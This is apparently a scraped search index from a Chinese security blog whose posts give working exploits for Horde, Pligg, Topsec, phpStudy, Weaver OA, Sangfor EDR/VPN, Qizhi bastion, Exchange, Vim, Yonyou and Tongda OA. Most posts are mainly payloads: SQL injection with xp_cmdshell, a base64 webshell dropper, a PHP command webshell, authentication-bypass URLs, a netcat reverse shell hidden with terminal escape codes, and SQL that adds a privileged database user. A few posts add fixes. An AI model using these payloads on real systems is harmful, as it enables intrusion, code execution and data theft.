pop thy shell!iduid=33(www-data) gid=33(www-data) groups=33(www-data)pwd/var/www/horde/services 参考链接：https://srcincite.io/pocs/zdi-20-1051.py.txt","link":"/2020/09/14/WEB/Exploit/Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"title":"Pligg远程命令执行(CVE-2020-25287)","text":"漏洞描述the_file由于无需检查扩展名，我们可以通过模板编辑器菜单使用参数来访问任何文件，然后将webshell创建到现有的php文件中 影响版本Pligg2.0.3版本 漏洞利用 转到/admin/admin_editor.php拦截请求并将路径更改为文件。 例如得到index.php申请： 12345678910111213141516POST /admin/admin_editor.php HTTP/1.1Host: kliqqiContent-Length: 33Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://kliqqiContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://kliqqi/admin/admin_editor.phpAccept-Encoding: gzip, deflateAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7Cookie: panelState=CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID=lfkc3gtrv5o1golmt5md3; mnm_user=Admin; mnm_key=QWRtaW46MjI0R2dEVTAxZncxZzplConnection: closethe_file=..%2Findex.php&amp;open=Open 模版编辑器功能可以编辑任意文件内容,在文件中加入恶意代码导致代码执行。 比如 123 if($_GET['cmd']){ system($_GET['cmd']);} 访问website.fr?cmd=dir","link":"/2020/09/17/WEB/Exploit/Pligg%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-25287/"},{"title":"天融信TopApp-LB 负载均衡系统Sql注入漏洞","text":"1POST /acc/clsf/report/datasource.php HTTP/1.1Host: localhostConnection: closeAccept: text/javascript, text/html, application/xml, text/xml, */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Accept-Language: zh-CN,zh;q=0.9Content-Type: application/x-www-form-urlencoded t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@。。 网友称以下两个历史漏洞仍然可以复现。 https://www.uedbox.com/post/21626/ 简要描述：天融信负载均衡TopApp-LB系统无需密码直接登陆 详细说明：.../.../.../https://.../ 1用户名随意 密码：;id 漏洞证明： https://www.uedbox.com/post/22193/ TopApp-LB负载均衡（绝对是随机找的）https://101.231.40.234/执行命令 执行命令 1; ping 9928e5.dnslog.info; echo 命令被成功执行，效果如图。","link":"/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9FSql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"title":"phpStudy(小皮面板)v8.1.0.7 nginx 解析漏洞","text":"一、**phpStudy**(小皮面板)简介： phpStudy国内12年老牌公益软件，集安全，高效，功能与一体，已获得全球用户认可安装，运维也高效。支持一键LAMP,LNMP,集群,监控,网站,FTP,数据库,JAVA等100多项服务器管理功能。 二、漏洞简介： 小皮面板 &lt;= 8.1.0.7: 啊这 其实这个漏洞确实不是小皮的问题,而是2017年就出现的nginx解析漏洞。 漏洞原理**：** 1、由于错误配置(但是测试的时候是安装完后的默认配置，我在官方论坛也反馈了，他们还狡辩。。。)导致nginx把以.php结尾的文件交给fastcgi处理,为此可以构造http://www.xxx.com/test.gif/xx.php (任何服务器端不存在的php文件均可,比如a.php) 2、但是fastcgi在处理xx.php文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了/test.gif。 3、 最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将.png等文件当做代码解析。localhost_80.conf原始配置： 123456789location ~ \\.php(.*)$ { fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_split_path_info ^((?U).+\\.php)(/?.+)$; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info; include fastcgi_params; } 三、漏洞复现： 测试环境：phpStudy(小皮面板)8.1.0.7 + 图片马（一定要注意不是那种copy的马子 有几率失败，可以下载这个马子测试）复现如图： 执行系统命令：四、修复php.ini 中 fix_pathinfo 禁用为0cgi.fix_pathinfo=0 nginx.conf添加如下代码 12345678910111213location ~ \\.php(.*)$ { if ( $fastcgi_script_name ~ \\..*\\/.*php ){ return 403; } fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_split_path_info ^((?U).+\\.php)(/?.+)$; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info; include fastcgi_params; } 参考链接：https://mrxn.net/news/675.html","link":"/2020/09/14/WEB/Exploit/phpStudy-%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF-v8-1-0-7-nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"title":"天融信数据防泄漏系统越权修改管理员密码","text":"无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd 接口未授权访问,造成直接修改任意用户密码。:默认superman账户uid为1。 POST /?module=auth_user&amp;action=mod_edit_pwd Cookie: username=superman; uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1","link":"/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/"},{"title":"宝塔面板phpmyadmin未授权访问漏洞","text":"一、漏洞简介phpmyadmin未授权访问漏洞 二、影响范围宝塔Linux面板7.4.2版本和Windows面板6.8版本 三、复现过程漏洞未phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。 漏洞URL：http://ip:888/pma 即可直接登录（但要求必须安装了phpmyadmin）","link":"/2020/09/12/WEB/Exploit/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"title":"泛微OA云桥任意文件读取和目录遍历漏洞","text":"未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,输入文件路径-&gt;读取文件内容。返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。 1、 downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。 2、通过查看文件接口访问 /file/fileNoLogin/id 想到一个新的思路，能够在漏洞利用过程中找到更多有用的信息。 1、简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。 2、参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历” 3、目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载。 d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库 修复建议: 关闭程序路由 /file/fileNoLogin","link":"/2020/09/14/WEB/Exploit/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"title":"绿盟UTS综合威胁探针管理员任意登录","text":"绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关网络安全威胁风险，及时检测漏洞、病毒木马、网络攻击情况，及时发现网络安全事件线索，及时通报预警重大网络安全威胁，调查、防范和打击网络攻击等恶意行为，保障重要信息系统的网络安全。绿盟综合威胁探针设备版本V2.0R00F02SP02及之前存在此漏洞。 处置意见:建议尽快更新补丁至最新： http://update.nsfocus.com/update/listBsaUtsDetail/v/F02 漏洞利用过程：对响应包进行修改，将false更改为true的时候可以泄露管理用户的md5值密码利用渠道的md5值去登录页面7ac301836522b54afcbbed714534c7fb成功登录，登录后通过管理员权限对设备进行管控，并且可以看到大量的攻击信息，泄露内部网络地址包括资产管理。 本文链接：https://www.hackbug.net/archives/112.html","link":"/2020/09/13/WEB/Exploit/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/"},{"title":"齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）","text":"齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835） 未授权无需登录。 1、访问 http://10.20.10.11/listener/cluster_manage.php :返回 “OK”. 2、访问如下链接即可getshell，执行成功后，生成PHP一句话马 3、/var/www/shterm/resources/qrcode/lbj77.php 密码10086 1https://10.20.10.10/ha_request.php?action=install&amp;ipaddr=10.20.10.11&amp;node_id=1${IFS}|`echo${IFS}&quot; ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64${IFS}- d|bash`|${IFS}|echo${IFS} 这里假设10.20.10.10为堡垒机的IP地址。 另外一个版本是java的。 POST /shterm/listener/tui_update.php a=[“t’;import os;os.popen(‘whoami’)#”]","link":"/2020/09/13/WEB/Exploit/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2019-20835%EF%BC%89/"},{"title":"Java反序列化","text":"Java反序列化背景Java反序列化漏洞最早是2015年年初AppSecCali会议上提出了漏洞利用思路，在2015年11月FoxGlove Security 安全团队才真实利用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的，这个漏洞直接 可以攻击WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版，在当时被称为是”2015年最被低估的漏洞”。 Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有 力的数据结构类型并且实现了各种集合工具类。包括FileUpload、Betwixt、Commons Code、Commons Compress、 Commons CSV等开源工具(下面是JAVA COLLECTION 的介绍)。 Java Collection 12345678910111213141516JAVACOLLECION是java的集合类，用于存储对象，而且长度可变，可存储不同类型的对象。JAVACOLLECTION不同的容器对数据 的存储方式不同，即数据结构不同。JAVA集合的体系框架:collection(接口,最基本的集合)实现接口的类，集合类:setHashSet/TreeSet...listArrayList/LinkedList...mapvector Java反序列化概念在Java程序中，序列化是程序将对象转换为字节数组，反序列化即为逆过程，将客户端的字节数据转换成对象。 序列化的目的是将对象转换为可存储或传输的字节数组，实现持久化存储。实际开发代码(部分): 123456789101112131415161718192021222324252627282930public class RedisObjectSerializer implements RedisSerializer&lt;Object&gt; { private Converter&lt;Object, byte[]&gt; serializer = new SerializingConverter(); private Converter&lt;byte[], Object&gt; deserializer = new DeserializingConverter(); static final byte[] EMPTY_ARRAY = new byte[0];public Object deserialize(byte[] bytes) { if (isEmpty(bytes)) { return null; } try { return deserializer.convert(bytes); } catch (Exception ex) { throw new SerializationException(&quot;Cannot deserialize&quot;, ex); } }// 序列化方法// 如果Bytes为空，返回null// 否则使用serializer.convert(bytes)为Objectpublic byte[] serialize(Object object) { if (object == null) { return EMPTY_ARRAY; } try { return serializer.convert(object); } catch (Exception ex) { return EMPTY_ARRAY; } }//判断字节数组是否为空//@param data//@returnprivate boolean isEmpty(byte[] data) { return (data == null || data.length == 0); } } Java反序列化漏洞原理1234间接或直接暴露反序列化API，导致用户操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。特点:1.aced0005是java序列化内容的特征，如果经过base64编码，那么相对应的是rO0AB。2.数据包中出现&quot;sr类名&quot;3.某些反序列化数据的content-type为application/x-serialization 如何检测Java反序列化测试脚本12345678910111213import os import base64payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']def generate(name, cmd): for payload in payloads: final = cmd.replace('REPLACE', payload) print 'Generating ' + payload + ' for ' + name + '...' command = os.popen('java -jar ysoserial.jar ' + payload + ' &quot;' + final + '&quot;') result = command.read() command.close() encoded = base64.b64encode(result) if encoded != &quot;&quot;: open(name + '_intruder.txt', 'a').write(encoded + '\\n')generate('Windows', 'ping -n 1 win.REPLACE.server.local') generate('Linux', 'ping -c 1 nix.REPLACE.server.local') 将脚本生成的文件加载至Burpsuit进行Intruder，服务器端执行tcpdump icmp查看是否有命令执行成功。 测试工具ysoserial 是反序列化生成payload的工具。Java-Deserialization-Scanner Burpsuit 插件(Burp Pro 插件商店可直接安装)，识别流量，主动被动探测。 freddy Burpsuit 插件(Burp Pro 插件商店可直接安装)。 ysoserial工具学习java动态代理123456789代理委托类和代理类静态代理和动态代理静态代理，委托类和代理类同时实现一个接口，两者通过聚合实现，代理类需要有一个委托类的引用。动态代理是通过在委托类和代理类之间设置一个中介类，中介类实现InvokeHandler接口，作为调用处理器拦截对代理类方法 的调用.静态代理和动态代理: 参考资料： [Java Proxy和CGLIB 动态代理原理](Java Proxy 和 CGLIB 动态代理原理 Java动态代理) Java 动态代理 Java反射机制参考资料 深入解析Java反射（1）-基础 Jboss 反序列化漏洞利用实例 确定jboss应用","link":"/2020/09/12/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"CVE-2020-16875: Exchange Server 远程代码执行漏洞","text":"更新公告:https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875 微软公告说的很明显,只需要一个Exchange用户账号。就能在Exchange服务器上执行任意命令。 https://srcincite.io/pocs/cve-2020-16875.py.txt https://srcincite.io/pocs/cve-2020-16875.ps1.txt 12345678researcher@incite:~$ ./poc.py(+) usage: ./poc.py &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;(+) eg: ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaintresearcher@incite:~$ ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint(+) logged in as harrym@exchangedemo.com(+) found the __viewstate: /wEPDwUILTg5MDAzMDFkZFAeyPS7/eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5(+) triggered rce as SYSTEM!","link":"/2020/09/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/CVE-2020-16875-Exchange-Server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"title":"RCE-Vim-Neovim 任意代码执行漏洞分析(CVE-2019-12735)","text":"0x00 背景 vim/neovim 爆出远程代码执行漏洞，打开恶意文件即可出发，受影响的版本： vim&lt;8.1.1365 Neovim&lt;0/36 poc_address 0x01 漏洞成因漏洞产生于Vim的modeline功能中，modeline功能便于文件在共享时保持一致的编辑格式。例如，我们通常会在Python文件开头加上modeline来设置缩进 1# vim: ai ts=4 sts=4 et sw=4 ft=python # vim: autoindent tabstop=4 shiftwidth=4 expandtab softtabstop=4 filetype=python 由于modeline中的命令运行于命令模式(在正常模式下按:进入)，而在命令模式下可以进行修改文件、执行脚本等敏感操作，这就产生了被恶意攻击的可能。 因此从安全角度考虑，在modeline中，只支持set命令，同时一些配置项会被隔离到沙箱(sandbox)中运行。 在沙箱中，修改文件、修改快捷键、执行shell脚本等操作都被禁止。沙箱检查由函数check_secure实现，用HAVE_SANDBOX判断是否在沙箱中，是的话生成错误信息并返回TRUE。 12345678910111213141516171819202122232425262728// vim/src/ex_cmds.c/* * Check if the secure flag is set (.exrc or .vimrc in current directory). * If so, give an error message and return TRUE. * Otherwise, return FALSE. */ intcheck_secure(void){ if (secure) { secure = 2; emsg(_(e_curdir)); return TRUE; }#ifdef HAVE_SANDBOX /* * In the sandbox more things are not allowed, including the things * disallowed in secure mode. */ if (sandbox != 0) { emsg(_(e_sandbox)); return TRUE; }#endif return FALSE;} check_secure函数在一些涉及敏感操作的地方被用到，例如在buf_write函数中的使用，禁止了在沙箱模式下写buf文件。 123456789101112131415// vim/src/fileio.c intbuf_write(...){ // ... /* * Disallow writing from .exrc and .vimrc in current directory for * security reasons. */ if (check_secure()) return FAIL; // ... } 然而在:source!命令中，并没有进行沙箱检查。:source!命令用于在命令模式下逐个运行目标文件中的命令，通常被用来加载配置文件。同时，在命令模式下有多种方式执行shell脚本。 前文提到，可以在modeline中设置的配置项是有限的，因此需要一个能让我们执行:source!的配置项。 配置项的限制是通过P_SECURE这个flag来判断的，foldexpr没有设置P_SECURE，符合要求。 12345678910111213141516171819202122232425// vim/src/option.c// foldexpr 未设置P_SECUREstatic struct vimoption options[] ={ // ... {&quot;foldexpr&quot;, &quot;fde&quot;, P_STRING|P_ALLOCED|P_VIM|P_VI_DEF|P_RWIN|P_MLE,#if defined(FEAT_FOLDING) &amp;&amp; defined(FEAT_EVAL) (char_u *)VAR_WIN, PV_FDE, {(char_u *)&quot;0&quot;, (char_u *)NULL}#else (char_u *)NULL, PV_NONE, {(char_u *)NULL, (char_u *)0L}#endif SCTX_INIT}// ... };// ...// 通过option的flag判断if (flags &amp; (P_SECURE | P_NO_ML)){ errmsg = _(&quot;E520: Not allowed in a modeline&quot;); goto skip;} 因此，可以构造PoC如下： 123:!uname -a||&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;source\\!\\ \\%&quot;):fdl=0:fdt=&quot; 保存成文件poc.txt，用Vim打开，命令uname -a将会被执行。 0x02 POC 分析命令执行 12# poc.txt:!uname -a||&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;source\\!\\ \\%&quot;):fdl=0:fdt=&quot;&lt;/code&gt;&lt;br /&gt; 打开poc.txt时，Vim会在首行寻找modeline，从vi:处开始匹配，忽略前面的字符，解析出的modeline表达式为： 1vi:fen:fdm=expr:fde=assert_fails&lt;code class=&quot;language-bash&quot;&gt;(&quot;source\\!\\ \\%&quot;)&lt;/code&gt;:fdl=0:fdt= modeline中的配置项(option settings)通过:分隔，vi后面的每一项都会当做:set的参数在normal模式下被运行。 这里的一系列配置都是有关于代码折叠的，让我们逐个解析配置项: fen: 当值为off时，所有的代码折叠都被打开，默认是off fdm=expr: 产生折叠的方式，可能的值有manual, indent, expr, marker, syntax, diff。 其中expr表示将由’foldexpr’的值来给出某一行的折叠level fde=assert_fails(“source! %”): fde是foldexpr的缩写，功能见上一条；source!命令前文已经提过，这里的%是指当前文件；assert_fails用于执行命令并处理错误信息，这里我们只用于执行命令。 fdl=0: 折叠的程度，设置为0时会关闭所有的折叠，默认是0 fdt: 被关闭的折叠处显示的字符串,默认是”foldtext()” 综合下来，这个modeline会让Vim执行:source! poc.txt，让我们来看会发生什么。 poc.txt中只有一行，相当于在Vim normal mode中运行这一行，:!xxx表示在shell中执行xxx命令。 所以，下面的命令会在shell中被执行： 1vi:fen:fdm=expr:fde=assert_fails&lt;code class=&quot;language-bash&quot;&gt;(&quot;source\\!\\ \\%&quot;)&lt;/code&gt;:fdl=0:fdt= ||表示只有在前一个命令执行失败后才会执行后一个命令，在这里uname -a会执行成功，||后面的字符串被忽略，所以PoC到这里就执行成功了。 0x03 反弹shell漏洞作者给出了另一个PoC，可以反弹一个shell, 利用了转义字符使得恶意代码在终端不可见，还在PoC执行结束后重写了文件使得痕迹被彻底清除。 # 在另一终端窗口运行nc -vlp 9999 # shell.txt x1b[?7lx1bSNothing here.x1b:silent! w | call system(‘nohup nc 127.0.0.1 9999 -e /bin/sh &amp;’) | redraw! | file | silent! # ” vim: set fen fdm=expr fde=assert_fails(‘set\\ fde=x\\ |\\ source!\\ %’) fdl=0: x16x1b[1Gx16x1b[KNothing here.”x16x1b[D n 除去转义字符和重写文件部分，可以简化成如下所示： 12# shell_simple.txt:call system('nohup nc 127.0.0.1 9999 -e /bin/sh &amp;') ||&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;source! %&quot;):fdl=0:fdt=&quot; 由前面的知识我们可以知道，此poc会在vim的normal模式下运行： 1:call system('nohup nc 127.0.0.1 9999 -e /bin/sh &amp;') 拆开分析： call: 执行一个函数 system(): 执行shell命令 nohup nc 127.0.0.1 9999 -e /bin/sh &amp;： 反弹shell ps: modeline功能必须打开 普通用户的modeline功能默认开启，而root用户是默认关闭的。 可以在命令模式下使用:echo &amp;modeline查看开启情况，返回1就是开启、0就是关闭。modeline功能 需要打开，PoC才能成功运行，可以在~/.vimrc中(若没有自行创建)加上一行set modeline确保开启此功能。 第二个反弹shell的PoC，复制粘贴到本地运行会失败 该问题出现在转义字符上，用二进制查看工具Okteta打开shell.txt，可以看到转义字符x1b是非显示字符。转义字符常常用来控制终端显示、光标移动等，第二个PoC中就利用了转义字符隐藏代码的功能，有关转义字符的知识可以参考这个链接ansi-escape-codes。 1234 $ cat shell.txt # 部分输出在终端中被隐藏Nothing here$ cat -A shell.txt ^[[?7l^[SNothing here.^[:silent! w | call system(‘nohup nc 127.0.0.1 9999 -e /bin/sh &amp;’) | redraw! | file | silent! # “ vim: set fen fdm=expr fde=assert_fails(‘set fde=x | source! %’) fdl=0: ^V^[[1G^V^[[KNothing here.”^V^[[D $ 作者文章给出代码中的x1b是为了更清晰地表达，并不能直接复制使用。 所以如果我们想要修改第二段利用代码，比较简单的方式是是下载源文件，修改执行命令的部分，当然也可以使用二进制编辑器直接编写或修改。 0x04 修复Vim发布了 patch 8.1.1365: source command doesn’t check for the sandbox 在openscript函数中增加了沙箱的检查，防止在沙箱中source文件。 0x05 安全建议 更新到vim &gt;= 8.1.1365 / neovim &gt; v0.3.6 在vimrc中加入set nomodeline，禁用modeline 不要轻易打开来路不明的文件 0x06 参考2019-06-04_ace-vim-neovim Slash analyze vim online help vim patch","link":"/2019/06/24/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/RCE-Vim-Neovim-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-12735/"},{"title":"用友GRP-u8 注入","text":"12POST /Proxy HTTP/1.1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)Host: localhostContent-Length: 341Connection: Keep-AliveCache-Control: no-cachecVer=9.8.0&amp;dp=&lt;?xml version=&quot;1.0&quot; encoding=&quot;GB2312&quot;?&gt;&lt;R9PACKET version=&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;exec xp_cmdshell 'whoami'&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;","link":"/2020/09/13/WEB/Exploit/%E7%94%A8%E5%8F%8BGRP-u8-%E6%B3%A8%E5%85%A5/"},{"title":"深信服-SANGFOR终端检测响应平台-任意用户登录","text":"前两天爆出来的命令执行，今天在给大家爆一个任意用户登录；看源码看到的，我测试的时候可以打到3.2.19版本，后面的版本我就不知道了； fofa指纹：title=”SANGFOR终端检测响应平台” 漏洞利用： 只要用户存在就可以登陆 payload： 1https://ip/ui/login.php?user=需登录的用户名 列如： 1https://1.1.1.1:1980/ui/login.php?user=admin 查询完毕以后即可登录平台。","link":"/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"},{"title":"深信服 SSL VPN - Pre Auth 修改绑定手机","text":"漏洞起因： 漏洞分析老版本(M7.6.1)代码放上，看不懂的直接看 POC 吧；新版本的没绕成功还在审，所以不确定是不是这个 POC123https://&lt;path&gt;/por/changetelnum.csp?apiversion=1newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1 演示","link":"/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-Pre-Auth-%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/"},{"title":"深信服EDR3.2.21 任意代码执行漏洞分析","text":"漏洞原理 dev_linkage_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口 主要调用 跟进 12345可以看到 第一个检查为 req_url=_SERVER['PHP_SELF'];绕过第一个检查:在他们系统nginx配置文件里面: 通过nginx规则可以得知,他们没有设置禁止外网访问.从而可以直接访问 /api/edr/sangforinter/v2/xxx 绕过 第一个检查 第二检查**:** 权限检查跟进check_access_token 1234这里if(md5_str==json_token[&quot;md5&quot;]) 引发第二个漏洞: php弱类型导致的漏洞绕过只需要传入一个base64编码的json内容为 {“md5”:true}即可 至此**权限检查绕过完毕** 来到 process_cssp.php 文件 存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的. 绕过:{“params”:”w=123&quot;‘1234123’&quot;|命令”} 结果如下 返回：","link":"/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR3-2-21-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"深信服edr远程命令执行cnvd-2020-46552漏洞分析","text":"EDR简介终端检测响应平台（EDR）是深信服公司提供的一套终端安全解决方案，方案由轻量级的端点安全软件（Agent）和管理平台（MGR）共同组成。 漏洞复现：远程命令执行漏洞CNVD-2020-46552 https://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id img 漏洞分析： 将c.php中的文件进行分析 img $_REQUEST将传入的参数保存为数组，将前台的参数传入到$show_form 进入$show_form img 使用了匿名函数，use调用了外部变量$strip_slashes、$show_input extract()函数会从数组中将变量导入到当前的符号表。他会把数组变成变量，函数使用数组的键名为变量名，键值为变量值 $host是如果存在就执行$strip_slashes($host) 那么传参数的时候使用:strip_slashes=system&amp;host=id img strip_slashes函数的作用是去掉&amp;变量中的\\","link":"/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"通达OA v11.7 后台SQL注入","text":"利用条件需要登录权限 原文作者给出了利用链注入加mysql权限，又是写木马的。用起来很舒服 1/general/hr/manage/query/delete_cascade.php?condition_cascade=select%20if((substr(user(),1,1)=%27r%27),1,power(9999,99)) 1、添加一个mysql用户 1grant all privileges ON mysql.* TO 'ateam666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 2、给创建的ateam666账户添加mysql权限。 1UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', 